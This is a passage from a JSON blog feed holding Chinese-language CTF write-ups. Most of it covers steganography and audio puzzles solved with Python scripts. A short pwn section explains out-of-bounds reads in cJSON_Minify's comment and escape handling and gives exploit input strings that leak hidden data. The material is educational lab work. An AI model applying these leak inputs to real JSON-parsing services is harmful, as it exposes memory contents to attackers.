            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"fumo_xor_cli116\"><a class=\"anchor\" href=\"#fumo_xor_cli116\">#</a> fumo_xor_cli（1.16）</h3>\n<p>啊啊啊，做这道题的时候就差一点，两张需要 xor 的图也导出来了，就是第一张那个需要叠加的图貌似排反了 ┭┮﹏┭┮<br />\n<s>（做的时候就发现两张图长度都是一样的，难怪我说 xor 出来不太对劲。。。）</s></p>\n<h4 id=\"第一张图\"><a class=\"anchor\" href=\"#第一张图\">#</a> 第一张图</h4>\n<p>nc 连上之后，发现出来了一堆彩色字符<br />\n python PIL 转为图片，发现中间有两张图片部分有点奇怪<br />\n搜索了一下大概是 ANSI 转义字符，大致格式如下：</p>\n<blockquote>\n<p>\\x1b[ 38 ; 2 ;  208 ; 243 ; 251 m9<br />\n38;2;<em>r</em>;<em>g</em>;<em>b</em> Set text colour to an RGB value (e.g.  <code>\\x1b[38;2;255;255;0m</code> )</p>\n</blockquote>\n<p>由于 编程水平稀烂，总之写的转 png 的代码。。。一言难尽<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;124.70.150.39&quot;</span>,<span class=\"number\">2333</span>)</span><br><span class=\"line\">img=[]</span><br><span class=\"line\">k=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(k&lt;<span class=\"number\">56</span>):</span><br><span class=\"line\">\timg.append(Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">133</span>,<span class=\"number\">50</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">\tr.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\tj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;<span class=\"number\">50</span>:</span><br><span class=\"line\">\t\ti=<span class=\"number\">0</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> s==<span class=\"string\">b&#x27;A\\x1b[&#x27;</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">b&#x27;\\n&#x27;</span><span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s.split(b&#x27;;&#x27;)[2:])</span></span><br><span class=\"line\">\t\t\t\tpixTuple=(<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">0</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">1</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">2</span>][:-<span class=\"number\">4</span>]))</span><br><span class=\"line\">\t\t\t\timg[k].putpixel((i,j),pixTuple)</span><br><span class=\"line\">\t\t\t\ti=i+<span class=\"number\">1</span></span><br><span class=\"line\">\t\tj=j+<span class=\"number\">1</span></span><br><span class=\"line\">\timg[k].save(<span class=\"string\">&#x27;/1/%d.png&#x27;</span>%(k))</span><br><span class=\"line\">\tk=k+<span class=\"number\">1</span></span><br></pre></td></tr></table></figure><br />\n 所以我们得到了 56 张图片，emm... 中间有两张是，五彩斑斓的，肯定有问题，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436722/Typera/2023/04/1fe97ece1c8993cbf990893b9dd0679d.png\" alt=\"SM1\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436754/Typera/2023/04/eea64334d4a3ac700d91945121083752.png\" alt=\"SM2\" /></p>\n<h4 id=\"第二张图\"><a class=\"anchor\" href=\"#第二张图\">#</a> 第二张图</h4>\n<p>在 Lu1u 的提示下，原来这里面还有个网址，进入 (<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRV9pREpCa1ZFQzRqWmFuenZxbldDQTA=\">https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA0</span>)<br />\n 在最后找到了一张 fumo 的图片<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436784/Typera/2023/04/3ca22b531d34b89abc0f97bc0c306804.png\" alt=\"SM3\" /><br />\n 放大发现了一个间隔为 9 的点阵，因为感觉这些点的颜色和上面得到的那两张图挺像的，所以想到继续可以把这些点提出来合成一张图片</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img0=Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>,(<span class=\"number\">100</span>,<span class=\"number\">133</span>))</span><br><span class=\"line\">img1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./fumo.png&#x27;</span>)</span><br><span class=\"line\">w,h=img1.size</span><br><span class=\"line\">i=<span class=\"number\">1</span></span><br><span class=\"line\">ni=<span class=\"number\">0</span></span><br><span class=\"line\">j=<span class=\"number\">1</span></span><br><span class=\"line\">nj=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;w:</span><br><span class=\"line\">\tj=<span class=\"number\">1</span></span><br><span class=\"line\">\tnj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;h:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(j==<span class=\"number\">1198</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\timg0.putpixel((ni,nj),img1.getpixel((i,j)))</span><br><span class=\"line\">\t\tj=j+<span class=\"number\">9</span></span><br><span class=\"line\">\t\tnj=nj+<span class=\"number\">1</span></span><br><span class=\"line\">\ti=i+<span class=\"number\">9</span></span><br><span class=\"line\">\tni=ni+<span class=\"number\">1</span></span><br><span class=\"line\">img0.show()</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436814/Typera/2023/04/244e58d3d0b2a5daf7ee5837e5d8beb1.png\" alt=\"SM4\" /></p>\n<h4 id=\"xor\"><a class=\"anchor\" href=\"#xor\">#</a> XOR</h4>\n<p>前面得到的两张图均为 133x50，而第二张图 100x133，这不是巧了，<br />\n前两张张图加在一起，跟后面的那张长宽一样，再结合题目 fumo_xor_cli<br />\nemm... XOR 啊<br />\n思路就有了，<s>结果就拼图这一步，方向错了〒▽〒</s><br />\n先观察一下四个角的像素点，把那两张图旋转一下，拼在一起<br />\n最后使用 stegsolve 异或一下就可以了<br />\n可能是因为拼图做的太糙了，所以异或出来的图有亿点不太对劲<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436840/Typera/2023/04/a7cb74294bd4da8aa2f732cbc86f4c4b.bmp\" alt=\"SM5\" /><br />\nps 处理了一下总算好看了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436868/Typera/2023/04/8898d7e36e8d29377d803605af7967da.png\" alt=\"SM6\" /></p>\n<h3 id=\"in_the_vaporwaves117118\"><a class=\"anchor\" href=\"#in_the_vaporwaves117118\">#</a> in_the_vaporwaves（1.17/1.18）</h3>\n<p>此前我对音频隐写了解甚少，只会简单地使用 Audacity，对音频文件做一些基本的观察、操作，<br />\n本题中涉及到 Python 的 wave 库使用，那就可以正好趁这个机会去学习一下。</p>\n<h4 id=\"观察原文件\"><a class=\"anchor\" href=\"#观察原文件\">#</a> 观察原文件</h4>\n<p>通过 Audacity 打开 c.wav，播放的时候稍微有点杂音，但听不出有什么不太对的地方 (/▽＼)<br />\n 放大来看，可以看出左右声道的波形貌似正好上下相反：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436891/Typera/2023/04/942c468dbd87e4787052099f715283e8.png\" alt=\"image-20230425233447828\" /></p>\n<h4 id=\"1使用wave库\"><a class=\"anchor\" href=\"#1使用wave库\">#</a> ①使用 Wave 库</h4>\n<p>使用 python 的 Wave 库将左右声道加起来，导出为一个 a.wav 的文件</p>\n<blockquote>\n<p><strong>nchannels</strong>: 声道数，<strong>sampwidth</strong>: 量化位数，<strong>framerate</strong>: 采样频率，<strong>nframes</strong>: 采样点数</p>\n</blockquote>\n<p>Wave 写入对象</p>\n<blockquote>\n<p><strong>Wave_write.setnchannels(n)</strong><br />\n 设置声道数。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setsampwidth(n)</strong><br />\n 设置采样字节长度为 n。</p>\n</blockquote>\n<blockquote>\n<p><strong>Wave_write.setframerate(n)</strong><br />\n 设置采样频率为 n。</p>\n</blockquote>\n<blockquote>\n<p>Wave_write.writeframes(data)<br />\n 写入音频帧并确保 nframes 是正确的。 如果输出流不可查找且在 data 被写入之后写入的总帧数与之前设定的 nframes 值不匹配将会引发错误。</p>\n</blockquote>\n<p>Write 读取对象</p>\n<blockquote>\n<p><strong>Wave_read.getnframes()</strong><br />\n 返回音频总帧数。<br />\n<strong>Wave_read.readframes(n)</strong><br />\n 读取并返回以 bytes 对象表示的最多 n 帧音频。</p>\n</blockquote>\n<p>struct 库：将字节串解读为打包的二进制数据</p>\n<blockquote>\n<p><strong>struct.unpack(format, buffer)</strong><br />\n 根据格式字符串 format 从缓冲区 buffer 解包（假定是由 pack (format, ...) 打包）。 结果为一个元组，即使其只包含一个条目。 缓冲区的字节大小必须匹配格式所要求的大小，如 calcsize () 所示。<br />\n<strong>struct.pack(format, v1, v2, ...)</strong><br />\n 返回一个 bytes 对象，其中包含根据格式字符串 format 打包的值 v1, v2, ... 参数个数必须与格式字符串所要求的值完全匹配。</p>\n</blockquote>\n<p>参照官方 wp，编写的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;c.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> c:</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;a.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> a:</span><br><span class=\"line\">\t\ta.setnchannels(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\ta.setsampwidth(<span class=\"number\">2</span>)  <span class=\"comment\">#此处量化位数应改为2</span></span><br><span class=\"line\">\t\ta.setframerate(<span class=\"number\">44100</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(c.getnframes()):</span><br><span class=\"line\">\t\t\tl,r=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, c.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t\td=l+r</span><br><span class=\"line\">\t\t\ta.writeframes(struct.pack(<span class=\"string\">&#x27;h&#x27;</span>,d))</span><br></pre></td></tr></table></figure><br />\n 但是，实际运行的时候，我发现这个脚本貌似有点问题...<br />\n 如果直接套用运行出来的音频长这样：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436900/Typera/2023/04/c6b92eaad52ca5f54cbb80e1c01191cc.png\" alt=\"image-20230425233457628\" /><br />\n 然后我仔细检查发现，官方 wp 的量化位数设成了 1，改成 2 就可以了... (。_。)<br />\n（着实花了我好久，还以为是我自己写错了）<br />\n出来的 a.wav 如下图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436908/Typera/2023/04/47a2223d0102f0f858b27c6b0cc851ae.png\" alt=\"image-20230425233505802\" /></p>\n<p>但是，这脚本运行的时间也太长了吧，<strong>[Finished in 262.9s]</strong>  (￣▽￣)&quot;<br />\n 所以我又找到了一个比较快捷的方法：</p>\n<h4 id=\"2ffmpeg\"><a class=\"anchor\" href=\"#2ffmpeg\">#</a> ②ffmpeg</h4>\n<p>使用 ffmpeg 进行双声道合并，<br />\n从<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mZm1wZWcub3Jn\">链接</span>（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb2hudmFuc2lja2xlLmNvbS9mZm1wZWcvJUVGJUJDJTg5JUU0JUI4JThCJUU4JUJEJUJEZmZtcGVnJUU1JTg4JUIwTGludXglRTclOEUlQUYlRTUlQTIlODMlRTQlQjglOEIlRUYlQkMlOEMlRTglQkYlOTAlRTglQTElOEMlRUYlQkMlOUE=\">https://johnvansickle.com/ffmpeg/）下载 ffmpeg 到 Linux 环境下，运行：</span><br />\n <code>ffmpeg -i c.wav -f wav -ac 1 -ab 128k -y 1_dan1.wav</code>  命令，<br />\n获得 a.wav 文件。</p>\n<p>这次得到的 a.wav 是这样的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436919/Typera/2023/04/6e8ff45b5b28216617a2427f50628c81.png\" alt=\"image-20230425233516666\" /><br />\n 差别不大～<br />\n 这就是比较常规的摩斯密码了，转换后得到 flag</p>\n<h4 id=\"摩斯电码音频转文字119\"><a class=\"anchor\" href=\"#摩斯电码音频转文字119\">#</a> 摩斯电码音频转文字（1.19）</h4>\n<p>emm... 我顺带研究了一下，如何用 python 把摩斯密码从音频文件里直接读出来，<br />\n这个脚本我另外找了一道题试验了一下，应该是没啥问题的，<br />\n（它只适用于单声道的摩斯电码，所以使用前要先处理好音频文件）<br />\n稀烂的编程水平就不提了，代码如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;a.wav&#x27;</span></span><br><span class=\"line\">WAVE = wave.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">sample_frequency, audio_sequence = wavfile.read(filename)</span><br><span class=\"line\">space=[]</span><br><span class=\"line\">voice=[]</span><br><span class=\"line\">l1=<span class=\"number\">0</span></span><br><span class=\"line\">l2=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l1=l1+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i-<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> l1&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\">            space.append(l1)</span><br><span class=\"line\">        l1=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(WAVE.getparams().nframes):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(audio_sequence[i]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i]&lt;-<span class=\"number\">10</span>):</span><br><span class=\"line\">        l2=l2+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span>((audio_sequence[i-<span class=\"number\">1</span>]&gt;<span class=\"number\">10</span> <span class=\"keyword\">or</span> audio_sequence[i-<span class=\"number\">1</span>]&lt;-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i]&gt;=-<span class=\"number\">10</span>) <span class=\"keyword\">and</span> (audio_sequence[i+<span class=\"number\">1</span>]&lt;=<span class=\"number\">10</span> <span class=\"keyword\">and</span> audio_sequence[i+<span class=\"number\">1</span>]&gt;=-<span class=\"number\">10</span>)):</span><br><span class=\"line\">        voice.append(l2)</span><br><span class=\"line\">        l2=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">m_s=<span class=\"built_in\">min</span>(space)</span><br><span class=\"line\">M_s=<span class=\"built_in\">max</span>(space[<span class=\"number\">1</span>:])</span><br><span class=\"line\">m_v=<span class=\"built_in\">min</span>(voice)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tran</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(voice[i]//m_v==<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(space)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(space[i]//m_s==<span class=\"number\">1</span>):</span><br><span class=\"line\">        Str=Str+tran(i)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span>(space[i]&gt;M_s):</span><br><span class=\"line\">    \tvoice.insert(i,voice[i])</span><br><span class=\"line\">    \tStr=Str+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        Str=Str+tran(i)+<span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">Str=Str+tran(<span class=\"built_in\">len</span>(voice)-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> (Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h2>\n<blockquote>\n<p>pwn 部分... 由于我手残删掉了保存源文件，最后只问学长要到了其中两道题的，对我复现造成了极大的困扰，不过幸好这次的官方 wp 挺详细的，还可以对着 wp 一点一点的想，但我是菜鸡本菜，还是花了超多的时间去复现 ╥﹏╥... 不过总体来说收获还是挺多的</p>\n</blockquote>\n<h3 id=\"dataleak129\"><a class=\"anchor\" href=\"#dataleak129\">#</a> Dataleak（1.29）</h3>\n<p><s>（隔了挺久的... 除了中间混了个 hgame，还有 HWS 入营赛 (虽然太菜了没啥用)，当然还有在认真地摸鱼啦）</s></p>\n<p>连上远程，需要 leak 的数据长度为 22，<br />\nIDA 查看 cJSON_PWN：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436929/Typera/2023/04/4dcc2553fda4e522e344eccb3f71b8fd.png\" alt=\"image-20230425233526169\" /><br />\n 内存结构还是比较清楚的<br />\n按定义顺序，先是 buf，然后是 v5，最后是 v6 (存要 leak 的数据的地方)<br />\n 两次循环，每次 buf、v5，写入数据长 14，结尾均有 \\x00<br />\n 每次 cJSON_Minify () 先处理 buf 的字符，然后读出 v5 中 11 字节</p>\n<h4 id=\"漏洞点\"><a class=\"anchor\" href=\"#漏洞点\">#</a> 漏洞点</h4>\n<p>一共应该有两个漏洞点，可以从给的 so 文件中查看，</p>\n<ul>\n<li>处理 /* 的时候，会不断遍历中间的字符直到遇到 \\x00 <s>（或 */ ）</s>，可能造成越界<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436937/Typera/2023/04/560f7380f89320b8d0bfa86942368be9.png\" alt=\"image-20230425233533907\" /></li>\n<li>处理 &quot; 的时候，如果遇到 \\ ，会越过两个字符<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436946/Typera/2023/04/0d185944b3f9a89c3f0cebb68e2e1cdd.png\" alt=\"image-20230425233541340\" /></li>\n</ul>\n<p>其中，第一个漏洞会将遍历到的字符舍去，所以后续的字符会填充到遍历过的字符位置上（包括 /*），而第二个漏洞只会越过 \\ 后的两个字符，中间遍历的字符将会保留。</p>\n<p>所以会有多个方法实现 data 的泄露，而第一个漏洞能够达成的效果强于第二个，所以可以全程使用第一个漏洞完成泄露</p>\n<h4 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h4>\n<p>由于一次只能读取 11 个字符，所以需要 leak 两次，<br />\n但大致思路就是要利用漏洞，先越过 buf 后的 \\x00，让 cJSON_PWN 能继续处理 v5 的字符，<br />\n然后变换 /* 的位置，将 v5 内的字符替换为我们所需要的 data</p>\n<h5 id=\"方法1\"><a class=\"anchor\" href=\"#方法1\">#</a> 方法 1</h5>\n<p>如果两个漏洞都想利用到的话，可以先使用第二个漏洞，将 \\ 出现的位置放在 buf 的末尾（就是第 14 个字符），从而越过后面的 \\x00 继续处理 v5，<br />\n然后 /* 放在 v5 的开头，直接替换后面 16 个 data 的位置（算上开头的 /* 和末尾的 \\x00 一共 16 个）<br />\n<strong>exp1：</strong> <code>&quot;aaaaaaaaaaaa\\/*aaaaaaaaaaaa</code> <br />\n 获得前 11 个 data</p>\n<p>要获得后 11 个 data，必须要把前 11 个 data 放到 buf 里面，才能让后 11 个 buf 出现在 v5 里被读出来，<br />\n这里再用第二个漏洞实在是太麻烦了（仔细想了想，<strong>貌似也不可能</strong>），所以就用第一个解决。</p>\n<p>一个的 /* 直接放在开头，把后面的 16 个字符换进来，另一个的 /* 放在第 6 个字符的位置，这样加上后面包括 \\x00 在内的字符，一共有 11 个，<br />\n这样就把前 11 个 data 再换到 buf 里面，这样后 11 个 data 就正好再 v5 里面被读取<br />\n<strong> exp2：</strong> <code>/*aaaaaaaaaaaaaaaaa/*aaaaaaa</code> <br />\n 获得后 11 个 data。（实际上<strong> exp2</strong> 前后两个可以颠倒，效果一致，因为这里的 exp 无论是先换 16 个字符还是先换那 11 个，都是一样的）</p>\n<h5 id=\"方法2\"><a class=\"anchor\" href=\"#方法2\">#</a> 方法 2</h5>\n<p>方法 2 只变了 leak 前 11 个 data 的方法，后 11 个 data 的方式是一致的<br />\n把 /* 放在 buf 的末尾，算上 \\x00 一共会替换 4 个字符，为防止 data 的前 4 个字符被换进 buf，先用 aaaa 组成 v5 的前 4 个，然后再加上 /* ，替换出后面的 data<br />\n<strong>exp：</strong> <code>aaaaaaaaaaaa/*aaaa/*aaaaaaaa</code></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/",
            "title": "西湖论剑_YUSA的小秘密",
            "date_published": "2021-11-29T15:02:55.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"yusa的小秘密\"><a class=\"anchor\" href=\"#yusa的小秘密\">#</a> YUSA 的小秘密</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC95dXNhX3NtYWxsX3NlY3JldC56aXA=\">附件下载</span><br />\n题目描述：LSB，但又不是 LSB，众所周知不止 RGB...<br />\n 直接用 stegsolve 打开有两个通道能直接看到 flag，可是噪点实在太多了.<br />\n 联想到题目描述，开始查找资料.<br />\n 可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXRlY3RmLmZlaXNodS5jbi9kb2NzL2RvY2NucXpwR0NXSDFoa0RmNWxqR2RqT0pZZyNxSFJVQ1I=\"> Bytectf2020 的 Misc: Hardcore Watermark 01</span> 这道题</p>\n<blockquote>\n<p>图片中每个像素可以通过三个通道来表示，常见的是 <strong>R</strong> (red) <strong>G</strong> (green) <strong>B</strong> (blue) 模式。而本题用到的通道是 YCrCb。</p>\n</blockquote>\n<p>通过  <code>cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</code>  对 img 图片数据进行色彩空间转换，<br />\n然后保存图片：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> cv2 <span class=\"keyword\">import</span> cv2</span><br><span class=\"line\">img = cv2.imread(<span class=\"string\">&#x27;Yusa.png&#x27;</span>)</span><br><span class=\"line\">cv_color = cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)</span><br><span class=\"line\">cv2.imwrite(<span class=\"string\">&#x27;img.png&#x27;</span>, cv_color)</span><br></pre></td></tr></table></figure><br />\n 再用 stegsolve 看一下通道就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436506/Typera/2023/04/0c489cb73329a1ef49146321f8fde3bd.png\" 